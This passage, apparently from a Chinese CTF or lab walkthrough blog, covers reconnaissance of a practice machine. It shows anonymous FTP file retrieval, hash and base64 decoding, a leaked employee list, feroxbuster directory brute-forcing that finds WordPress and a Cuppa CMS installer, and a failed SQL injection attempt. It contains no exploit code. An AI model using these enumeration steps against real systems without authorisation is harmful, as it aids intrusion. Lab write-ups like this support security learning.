     ftp          <span class="number">4096</span> Jan <span class="number">28</span>  <span class="number">2018</span> new-employees</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> content</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">45578</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line">-rw-r--r--    <span class="number">1</span> ftp      ftp            <span class="number">29</span> Jan <span class="number">23</span>  <span class="number">2018</span> <span class="number">01</span>.txt</span><br><span class="line">-rw-r--r--    <span class="number">1</span> ftp      ftp           <span class="number">165</span> Jan <span class="number">23</span>  <span class="number">2018</span> <span class="number">02</span>.txt</span><br><span class="line">-rw-r--r--    <span class="number">1</span> ftp      ftp           <span class="number">582</span> Jan <span class="number">23</span>  <span class="number">2018</span> <span class="number">03</span>.txt</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; mget <span class="number">0</span>*.txt</span><br><span class="line">mget <span class="number">01</span>.txt [anpqy?]? </span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">45638</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY <span class="built_in">mode</span> data connection <span class="keyword">for</span> <span class="number">01</span>.txt (<span class="number">29</span> bytes).</span><br><span class="line"><span class="number">100</span>% |****************************************************************************************************************************************************|    <span class="number">29</span>      <span class="number">615</span>.<span class="number">65</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"><span class="number">29</span> bytes received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">47</span>.<span class="number">59</span> KiB/s)</span><br><span class="line">mget <span class="number">02</span>.txt [anpqy?]? </span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">43476</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY <span class="built_in">mode</span> data connection <span class="keyword">for</span> <span class="number">02</span>.txt (<span class="number">165</span> bytes).</span><br><span class="line"><span class="number">100</span>% |****************************************************************************************************************************************************|   <span class="number">165</span>        <span class="number">4</span>.<span class="number">76</span> MiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"><span class="number">165</span> bytes received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">347</span>.<span class="number">26</span> KiB/s)</span><br><span class="line">mget <span class="number">03</span>.txt [anpqy?]? </span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">49717</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY <span class="built_in">mode</span> data connection <span class="keyword">for</span> <span class="number">03</span>.txt (<span class="number">582</span> bytes).</span><br><span class="line"><span class="number">100</span>% |****************************************************************************************************************************************************|   <span class="number">582</span>        <span class="number">7</span>.<span class="number">20</span> MiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"><span class="number">582</span> bytes received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">209</span>.<span class="number">72</span> KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> ../docs</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">49082</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line">-rw-r--r--    <span class="number">1</span> ftp      ftp           <span class="number">138</span> Jan <span class="number">23</span>  <span class="number">2018</span> worktodo.txt</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; get worktodo.txt</span><br><span class="line"><span class="function">local: <span class="title">worktodo.txt</span> <span class="title">remote</span>: <span class="title">worktodo.txt</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||42211|)</span></span><br><span class="line"><span class="function">150 <span class="title">Opening</span> <span class="title">BINARY</span> <span class="title">mode</span> <span class="title">data</span> <span class="title">connection</span> <span class="title">for</span> <span class="title">worktodo.txt</span> (138 <span class="title">bytes</span>).</span></span><br><span class="line"><span class="function">100% |****************************************************************************************************************************************************|   138        2.99 <span class="title">MiB</span>/<span class="title">s</span>    00:00 <span class="title">ETA</span></span></span><br><span class="line"><span class="function">226 <span class="title">Transfer</span> <span class="title">complete</span>.</span></span><br><span class="line"><span class="function">138 <span class="title">bytes</span> <span class="title">received</span> <span class="title">in</span> 00:00 (427.82 <span class="title">KiB</span>/<span class="title">s</span>)</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">cd</span> ../<span class="title">new</span>-<span class="title">employees</span></span></span><br><span class="line"><span class="function">250 <span class="title">Directory</span> <span class="title">successfully</span> <span class="title">changed</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">ls</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||42554|)</span></span><br><span class="line"><span class="function">150 <span class="title">Here</span> <span class="title">comes</span> <span class="title">the</span> <span class="title">directory</span> <span class="title">listing</span>.</span></span><br><span class="line"><span class="function">-<span class="title">rw</span>-<span class="title">r</span>--<span class="title">r</span>--    1 <span class="title">ftp</span>      <span class="title">ftp</span>           155 <span class="title">Jan</span> 28  2018 <span class="title">employee</span>-<span class="title">names.txt</span></span></span><br><span class="line"><span class="function">226 <span class="title">Directory</span> <span class="title">send</span> <span class="title">OK</span>.</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; <span class="title">get</span> <span class="title">employee</span>-<span class="title">names.txt</span></span></span><br><span class="line"><span class="function"><span class="title">local</span>: <span class="title">employee</span>-<span class="title">names.txt</span> <span class="title">remote</span>: <span class="title">employee</span>-<span class="title">names.txt</span></span></span><br><span class="line"><span class="function">229 <span class="title">Entering</span> <span class="title">Extended</span> <span class="title">Passive</span> <span class="title">Mode</span> (|||49608|)</span></span><br><span class="line"><span class="function">150 <span class="title">Opening</span> <span class="title">BINARY</span> <span class="title">mode</span> <span class="title">data</span> <span class="title">connection</span> <span class="title">for</span> <span class="title">employee</span>-<span class="title">names.txt</span> (155 <span class="title">bytes</span>).</span></span><br><span class="line"><span class="function">100% |****************************************************************************************************************************************************|   155       68.36 <span class="title">KiB</span>/<span class="title">s</span>    00:00 <span class="title">ETA</span></span></span><br><span class="line"><span class="function">226 <span class="title">Transfer</span> <span class="title">complete</span>.</span></span><br><span class="line"><span class="function">155 <span class="title">bytes</span> <span class="title">received</span> <span class="title">in</span> 00:00 (58.46 <span class="title">KiB</span>/<span class="title">s</span>)</span></span><br><span class="line"><span class="function"><span class="title">ftp</span>&gt; </span></span><br></pre></td></tr></table></figure>

<p>此处文件都是纯文本的，如果不是纯文本，是可执行文件，进到ftp后，输入binary后再下载，不执行直接下载会损坏</p>
<h3 id="分析ftp下载的文件"><a href="#分析ftp下载的文件" class="headerlink" title="分析ftp下载的文件"></a>分析ftp下载的文件</h3><blockquote>
<p>01.txt</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ cat 01.txt</span><br><span class="line">New FTP Server For ../images.inc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>02.txt</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ cat 02.txt</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">############################################</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一段可能是md5,第二段字符可能是base64</p>
<p>看不出来可以用hash-identifier</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ hash-identifier &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27;</span><br><span class="line">   #########################################################################</span><br><span class="line">   #     __  __                     __           ______    _____           #</span><br><span class="line">   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span><br><span class="line">   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span><br><span class="line">   #     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span><br><span class="line">   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br><span class="line">   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span><br><span class="line">   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span><br><span class="line">   #                                                             By Zion3R #</span><br><span class="line">   #                                                    www.Blackploit.com #</span><br><span class="line">   #                                                   Root@Blackploit.com #</span><br><span class="line">   #########################################################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line"> Not Found.</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: 01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5($pass.$salt)</span><br><span class="line">[+] md5($salt.$pass)</span><br><span class="line">[+] md5($salt.$pass.$salt)</span><br><span class="line">[+] md5($salt.$pass.$username)</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($salt.$pass))</span><br><span class="line">[+] md5($salt.md5(md5($pass).$salt))</span><br><span class="line">[+] md5($username.0.$pass)</span><br><span class="line">[+] md5($username.LF.$pass)</span><br><span class="line">[+] md5($username.md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass))</span><br><span class="line">[+] md5(md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass).md5($salt))</span><br><span class="line">[+] md5(md5($salt).$pass)</span><br><span class="line">[+] md5(md5($salt).md5($pass))</span><br><span class="line">[+] md5(md5($username.$pass).$salt)</span><br><span class="line">[+] md5(md5(md5($pass)))</span><br><span class="line">[+] md5(md5(md5(md5($pass))))</span><br><span class="line">[+] md5(md5(md5(md5(md5($pass)))))</span><br><span class="line">[+] md5(sha1($pass))</span><br><span class="line">[+] md5(sha1(md5($pass)))</span><br><span class="line">[+] md5(sha1(md5(sha1($pass))))</span><br><span class="line">[+] md5(strtoupper(md5($pass)))</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>

<p>解密</p>
<p><img src="/../images/image-20221126110248192.png" alt="image-20221126110248192"></p>
<p><img src="/../images/image-20221126110301769.png" alt="image-20221126110301769">SS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$  echo &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure>

<blockquote>
<p>03.txt</p>
</blockquote>
<p><img src="/../images/image-20221126110550664.png" alt="image-20221126110550664"></p>
<blockquote>
<p>employee-names.txt</p>
<p>暴露了一些信息</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ cat employee-names.txt</span><br><span class="line">The ../images.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>worktodo.txt</p>
</blockquote>
<p>初看好像是乱码，仔细一看就是上下左右或者顺序颠倒了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ cat worktodo.txt</span><br><span class="line">        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用搜索引擎</p>
<p><img src="/../images/image-20221126125524958.png" alt="image-20221126125524958"></p>
<p><img src="/../images/image-20221126125557226.png" alt="image-20221126125557226"></p>
<p><img src="/../images/image-20221126125621617.png" alt="image-20221126125621617"></p>
<p>ftp的信息基本看完了，好像没什么能利用的，但实际上，这个地方得到的信息已经非常多了</p>
<p>到这也花了有二三十分钟，换个攻击面。</p>
<h3 id="80端口，web页面"><a href="#80端口，web页面" class="headerlink" title="80端口，web页面"></a>80端口，web页面</h3><p><img src="/../images/image-20221126130738739.png" alt="image-20221126130738739"></p>
<p>一般来说，主页面没啥攻击面，但不代表没有</p>
<p>刚刚扫到了一个wordpress,说明在某个目录下可能跑了一个wordprss</p>
<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>可以使用gobuster，dirb，feroxbuster</p>
<p>这里用feroxbuster</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo feroxbuster -u http://192.168.19.177 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben &quot;epi&quot; Risher 🤓                 ver: 2.7.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://192.168.19.177</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">301      GET        9l       28w      321c http://192.168.19.177/javascript =&gt; http://192.168.19.177/javascript/</span><br><span class="line">301      GET        9l       28w      320c http://192.168.19.177/wordpress =&gt; http://192.168.19.177/wordpress/</span><br><span class="line">200      GET      375l      968w    11321c http://192.168.19.177/</span><br><span class="line">301      GET        9l       28w      324c http://192.168.19.177/administrator =&gt; http://192.168.19.177/administrator/</span><br><span class="line">403      GET       11l       32w      302c http://192.168.19.177/server-status</span><br><span class="line">301      GET        9l       28w      328c http://192.168.19.177/javascript/jquery =&gt; http://192.168.19.177/javascript/jquery/</span><br><span class="line">200      GET    10351l    43235w   284394c http://192.168.19.177/javascript/jquery/jquery</span><br><span class="line">301      GET        9l       28w      334c http://192.168.19.177/administrator/templates =&gt; http://192.168.19.177/administrator/templates/</span><br><span class="line">301      GET        9l       28w      330c http://192.168.19.177/administrator/media =&gt; http://192.168.19.177/administrator/media/</span><br><span class="line">301      GET        9l       28w      327c http://192.168.19.177/administrator/js =&gt; http://192.168.19.177/administrator/js/</span><br><span class="line">301      GET        9l       28w      337c http://192.168.19.177/administrator/installation =&gt; http://192.168.19.177/administrator/installation/</span><br><span class="line">301      GET        9l       28w      335c http://192.168.19.177/administrator/components =&gt; http://192.168.19.177/administrator/components/</span><br><span class="line">301      GET        9l       28w      328c http://192.168.19.177/administrator/api =&gt; http://192.168.19.177/administrator/api/</span><br><span class="line">301      GET        9l       28w      333c http://192.168.19.177/administrator/language =&gt; http://192.168.19.177/administrator/language/</span><br><span class="line">301      GET        9l       28w      332c http://192.168.19.177/administrator/classes =&gt; http://192.168.19.177/administrator/classes/</span><br><span class="line">301      GET        9l       28w      341c http://192.168.19.177/administrator/components/stats =&gt; http://192.168.19.177/administrator/components/stats/</span><br><span class="line">301      GET        9l       28w      332c http://192.168.19.177/wordpress/wp-includes =&gt; http://192.168.19.177/wordpress/wp-includes/</span><br><span class="line">301      GET        9l       28w      329c http://192.168.19.177/wordpress/wp-admin =&gt; http://192.168.19.177/wordpress/wp-admin/</span><br><span class="line">301      GET        9l       28w      331c http://192.168.19.177/wordpress/wp-content =&gt; http://192.168.19.177/wordpress/wp-content/</span><br><span class="line">301      GET        9l       28w      333c http://192.168.19.177/administrator/api/test =&gt; http://192.168.19.177/administrator/api/test/</span><br><span class="line">301      GET        9l       28w      342c http://192.168.19.177/administrator/api/administrator =&gt; http://192.168.19.177/administrator/api/administrator/</span><br><span class="line">301      GET        9l       28w      342c http://192.168.19.177/administrator/installation/html =&gt; http://192.168.19.177/administrator/installation/html/</span><br><span class="line">301      GET        9l       28w      337c http://192.168.19.177/administrator/classes/ajax =&gt; http://192.168.19.177/administrator/classes/ajax/</span><br><span class="line">301      GET        9l       28w      339c http://192.168.19.177/wordpress/wp-content/plugins =&gt; http://192.168.19.177/wordpress/wp-content/plugins/</span><br><span class="line">301      GET        9l       28w      338c http://192.168.19.177/wordpress/wp-content/themes =&gt; http://192.168.19.177/wordpress/wp-content/themes/</span><br><span class="line">301      GET        9l       28w      339c http://192.168.19.177/wordpress/wp-content/uploads =&gt; http://192.168.19.177/wordpress/wp-content/uploads/</span><br><span class="line">301      GET        9l       28w      340c http://192.168.19.177/administrator/components/menu =&gt; http://192.168.19.177/administrator/components/menu/</span><br><span class="line">301      GET        9l       28w      339c http://192.168.19.177/wordpress/wp-content/upgrade =&gt; http://192.168.19.177/wordpress/wp-content/upgrade/</span><br><span class="line">301      GET        9l       28w      348c http://192.168.19.177/administrator/components/menu/classes =&gt; http://192.168.19.177/administrator/components/menu/classes/</span><br><span class="line">301      GET        9l       28w      345c http://192.168.19.177/administrator/components/menu/html =&gt; http://192.168.19.177/administrator/components/menu/html/</span><br><span class="line">301      GET        9l       28w      332c http://192.168.19.177/wordpress/wp-admin/js =&gt; http://192.168.19.177/wordpress/wp-admin/js/</span><br><span class="line">301      GET        9l       28w      333c http://192.168.19.177/wordpress/wp-admin/css =&gt; http://192.168.19.177/wordpress/wp-admin/css/</span><br><span class="line">301      GET        9l       28w      336c http://192.168.19.177/wordpress/wp-admin/images =&gt; http://192.168.19.177/wordpress/wp-admin/images/</span><br><span class="line">301      GET        9l       28w      338c http://192.168.19.177/wordpress/wp-admin/includes =&gt; http://192.168.19.177/wordpress/wp-admin/includes/</span><br><span class="line">301      GET        9l       28w      334c http://192.168.19.177/wordpress/wp-admin/user =&gt; http://192.168.19.177/wordpress/wp-admin/user/</span><br><span class="line">[####################] - 37s   960000/960000  0s      found:35      errors:696069 </span><br><span class="line">[####################] - 21s    30000/30000   1464/s  http://192.168.19.177 </span><br><span class="line">[####################] - 20s    30000/30000   1514/s  http://192.168.19.177/javascript </span><br><span class="line">[####################] - 28s    30000/30000   1100/s  http://192.168.19.177/wordpress </span><br><span class="line">[####################] - 34s    30000/30000   942/s   http://192.168.19.177/ </span><br><span class="line">[####################] - 28s    30000/30000   1072/s  http://192.168.19.177/administrator </span><br><span class="line">[####################] - 13s    30000/30000   2373/s  http://192.168.19.177/javascript/jquery </span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/administrator/media =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 27s    30000/30000   1208/s  http://192.168.19.177/administrator/templates </span><br><span class="line">[####################] - 33s    30000/30000   898/s   http://192.168.19.177/administrator/js </span><br><span class="line">[####################] - 27s    30000/30000   1148/s  http://192.168.19.177/administrator/installation </span><br><span class="line">[####################] - 26s    30000/30000   1179/s  http://192.168.19.177/administrator/components </span><br><span class="line">[####################] - 26s    30000/30000   1151/s  http://192.168.19.177/administrator/api </span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/administrator/language =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 33s    30000/30000   899/s   http://192.168.19.177/administrator/classes </span><br><span class="line">[####################] - 33s    30000/30000   958/s   http://192.168.19.177/administrator/components/stats </span><br><span class="line">[####################] - 33s    30000/30000   901/s   http://192.168.19.177/wordpress/wp-includes </span><br><span class="line">[####################] - 26s    30000/30000   1154/s  http://192.168.19.177/wordpress/wp-admin </span><br><span class="line">[####################] - 26s    30000/30000   1242/s  http://192.168.19.177/wordpress/wp-content </span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/administrator/api/test =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/administrator/api/administrator =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/administrator/installation/html =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 33s    30000/30000   941/s   http://192.168.19.177/administrator/classes/ajax </span><br><span class="line">[####################] - 18s    30000/30000   1714/s  http://192.168.19.177/wordpress/wp-content/plugins </span><br><span class="line">[####################] - 26s    30000/30000   1178/s  http://192.168.19.177/wordpress/wp-content/themes </span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/wordpress/wp-content/uploads =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 28s    30000/30000   1154/s  http://192.168.19.177/administrator/components/menu </span><br><span class="line">[####################] - 0s     30000/30000   0/s     http://192.168.19.177/wordpress/wp-content/upgrade =&gt; Directory listing (add -e to scan)</span><br><span class="line">[####################] - 32s    30000/30000   931/s   http://192.168.19.177/wordpress/wp-admin/js </span><br><span class="line">[####################] - 32s    30000/30000   945/s   http://192.168.19.177/wordpress/wp-admin/css </span><br><span class="line">[####################] - 27s    30000/30000   1140/s  http://192.168.19.177/wordpress/wp-admin/images </span><br><span class="line">[####################] - 25s    30000/30000   1244/s  http://192.168.19.177/wordpress/wp-admin/includes </span><br><span class="line">[####################] - 32s    30000/30000   1100/s  http://192.168.19.177/wordpress/wp-admin/user </span><br></pre></td></tr></table></figure>

<p>查看我们扫描到的目录</p>
<p>发现叫cuppa cms,是一个安装界面</p>
<p><img src="/../images/image-20221126152014249.png" alt="image-20221126152014249"></p>
<p>点击next</p>
<p>发现这个了databases拼错了，这就是一个点，这个错误就可以成为这个系统的一个特征</p>
<p><img src="/../images/image-20221126152255097.png" alt="image-20221126152255097"></p>
<p>我们试着重装一下</p>
<p><img src="/../images/image-20221126152557464.png" alt="image-20221126152557464"></p>
<p>发现不行</p>
<p><img src="/../images/image-20221126152522260.png" alt="image-20221126152522260"></p>
<p>可以尝试一下sql注入，发现不行，已经花了很多时间了，没必要死磕了，我们换个方式</p>
